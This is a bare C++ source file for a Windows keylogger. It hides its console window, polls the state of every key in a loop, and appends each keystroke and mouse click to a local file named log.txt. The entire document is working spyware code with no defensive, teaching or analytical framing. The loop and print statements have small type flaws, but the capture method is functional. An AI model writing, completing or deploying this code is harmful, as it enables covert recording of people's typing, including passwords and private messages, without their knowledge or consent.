#include <iostream>
#include <windows.h>
using namespace std;

int Save(int _key , char const *file);

int main(){
	
	FreeConsole();
	
    char i;
    while(true){
    	Sleep(10);
        for(i = 8; i <= 255; i++){
            if(GetAsyncKeyState(i) == -32767) {
                Save(i , "log.txt");
            }
        }
    }
    return 0;
}


int Save(int _key , char const *file) {
    cout << _key << endl;
    Sleep(10);
    
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file , "a+");
    if(_key == VK_LBUTTON){
    	fprintf(OUTPUT_FILE , "%s" , "[LEFT_BUTTON]");	
	}
	else if(_key == VK_RBUTTON){
		fprintf(OUTPUT_FILE , "%s" , "[RIGHT_BUTTON]");	
	}
	else if(_key == VK_BACK){
		fprintf(OUTPUT_FILE , "%s" , "[BACKSPACE]");	
	}
	else if(_key == VK_TAB){
		fprintf(OUTPUT_FILE , "%s" , "[TAB]");	
	}
	else if(_key == VK_SHIFT){
		fprintf(OUTPUT_FILE , "%s" , "[SHIFT]");	
	}
	else if(_key == VK_RETURN){
		fprintf(OUTPUT_FILE , "%s" , "[ENTER]");	
	}
	else if(_key == VK_CAPITAL){
		fprintf(OUTPUT_FILE , "%s" , "[CAPSLOCK]");	
	}
	else if(_key == VK_LEFT){
		fprintf(OUTPUT_FILE , "%s" , "[LEFT_ARROW]");	
	}
	else if(_key == VK_RIGHT){
		fprintf(OUTPUT_FILE , "%s" , "[RIGHT_ARROW]");	
	}
	else if(_key == VK_UP){
		fprintf(OUTPUT_FILE , "%s" , "[UP_ARROW]");	
	}
	else if(_key == VK_DOWN){
		fprintf(OUTPUT_FILE , "%s" , "[DOWN_ARROW]");	
	}
	
	else{
    fprintf(OUTPUT_FILE, "%s" , &_key);
	}
    fclose(OUTPUT_FILE);
    return 0;
}